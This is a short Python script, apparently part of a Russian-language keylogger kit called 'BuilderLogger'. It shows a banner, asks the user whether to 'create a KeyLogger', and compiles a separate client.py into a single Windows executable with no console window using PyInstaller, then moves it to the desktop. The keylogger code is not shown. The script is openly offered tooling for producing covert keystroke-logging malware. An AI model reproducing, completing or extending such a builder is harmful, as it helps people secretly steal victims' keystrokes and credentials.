import os

from pyfiglet import Figlet
from pystyle import Colors, Colorate, Center

import platform

from pathlib import Path


Error = Colors.red + "[-]" + Colors.reset
Success = Colors.green + "[+]" + Colors.reset


def get_desktop_path():
    home = Path.home()
    if platform.system() == "Windows":
        return home / "Desktop"
    elif platform.system() == "Linux":
        return home / "Desktop"
    else:
        return home


def compile_to_exe():
    try:
        import PyInstaller
    except ImportError:
        print(Colors.red + f"{Error} PyInstaller не установлен. Установите его: pip install pyinstaller" + Colors.reset)
        return
    
    try:
        os.system("pyinstaller --onefile --noconsole client.py")
    except Exception as e:
        print(f"Ошибка при конвертации файла в EXE: {e}")
    
    desktop = get_desktop_path()
    exe_src = Path("dist/client.exe")
    exe_dest = desktop / "client.exe"
    
    if exe_src.exists():
        exe_src.replace(exe_dest)
        print(f"{Success} файл был удачно конвертирован в EXE и перенесен на рабочий стол: {exe_dest}")
    else:
        print(Colors.red + f"{Error} Ошибка: EXE не найден в папке dist/" + Colors.red)


def display_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    t = Figlet(font='slant')
    Print = t.renderText('BuilderLogger')
    print(Colorate.Horizontal(Colors.red_to_black, Center.XCenter(Print)))


def main():
    display_banner()
    user_input = input("\nСоздать KeyLogger? (Yes/No): ").lower()
    if user_input == 'yes':
            compile_to_exe()
    else:
        print(Colors.green + "До свидания!" + Colors.reset)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(Colors.green + "До свидания!" + Colors.reset)